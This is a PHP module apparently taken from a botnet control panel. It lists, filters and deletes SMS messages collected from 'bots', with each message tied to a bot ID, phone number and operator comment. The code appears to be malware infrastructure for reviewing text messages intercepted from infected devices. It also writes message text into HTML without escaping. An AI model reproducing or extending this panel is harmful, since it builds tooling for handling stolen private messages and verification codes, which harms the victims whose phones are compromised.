<?php
require_once "cmd_mod.php";

class sms extends modBase
{
	protected $module_name = 'sms';

	function get_filter()
	{
		$fields = array(
		// id, name, placeholder, custom_pattern, is_like
			array('bot_id', 'Bot ID', 'Bot ID'),
			array('bot_comment', 'Bot comment', 'Part of any your comments'),
			array('number', 'Phone number', '35542223570', modBase::$filters['phone']),
			array('text', 'Text', 'Part of text in SMS'),
		);
		
		return $this->build_filter($fields);
	}
	
	function get_content()
	{
		$comment = trim($this->filter_values['bot_comment']);
		unset($this->filter_values['bot_comment']);
		
		if($comment)
		{
			$fields = 'bot_sms.id, bot_sms.bot_id, text, bot_sms.number, ts';
			$sql = "select %FIELDS% from bot_sms INNER JOIN bots ON bots.bot_id=bot_sms.bot_id ";
			$sql = $this->addWhere($sql, "bots.comment like({$this->db->quote_like($comment)})", 'bot_sms');
			
		}else{
			$fields = 'id, bot_id, text, number, ts';
			$sql = "select %FIELDS% from bot_sms";
		}
		
		$sql = $this->addWhere($sql, $this->filter_values, array('bot_id', 'number'));
		$sql .= " order by `ts` desc";

		// count request
		$total_rows = $this->db->exec(str_replace('%FIELDS%', 'count(bot_sms.id)', $sql), null, true)[0][0];

		$paging = $this->get_limit($total_rows, $this->results_on_page);
		$sql .= $paging['sql'];

		// data request
		$data = $this->db->exec(str_replace('%FIELDS%', $fields, $sql), null, true);

		$headers = array();
		$headers[] = '<a href="javascript:select_all(\'input[id^=&quot;sms-table-chk-&quot;]\');undefined"><span class="fui-checkbox-checked" title="Check all"></span></a>';
		$headers[] = 'Received at';
		$headers[] = 'Bot';
		$headers[] = 'Number';
		$headers[] = 'Text';
		$headers[] = 'Action';
	
		$rows = array();
		foreach($data as $row)
		{
			$tmp = array();

			$tmp[] = "<label class='checkbox' for='sms-table-chk-{$row['id']}'>
					<input type='checkbox' value='{$row['id']}' id='sms-table-chk-{$row['id']}' data-toggle='checkbox' />
				</label>";

			$tmp[] = hlp::human_date($row['ts']);
			
			$tmp[] = "<a onmouseout='hide_bot_details()' onmouseover='show_bot_details(this, \"{$row['bot_id']}\")' href='#page:menu-bot;bot_id={$row['bot_id']}'>Details</a>";
					
			$tmp[] = $row['number'];
			$tmp[] = "<textarea rows='2' class='form-control'>{$row['text']}</textarea>";
			$tmp[] = "<button type='button' class='btn btn-danger' onclick='show_ajax_form(\"panel_delete_sms\", [{$row['id']}])'>Delete</button>";
			
			$rows[] = $tmp;
		}

		$content = $this->get_table($rows, $headers, 'textcenter');

		$buttons = array(
			array('Delete selected', 'Delete all selected items', 'show_ajax_form("panel_delete_sms")', 'danger'),
		);
		
		return $this->wrap_content("Total: {$paging['total_rows']}", $content, $paging['pages'], $buttons);
	}
	

}
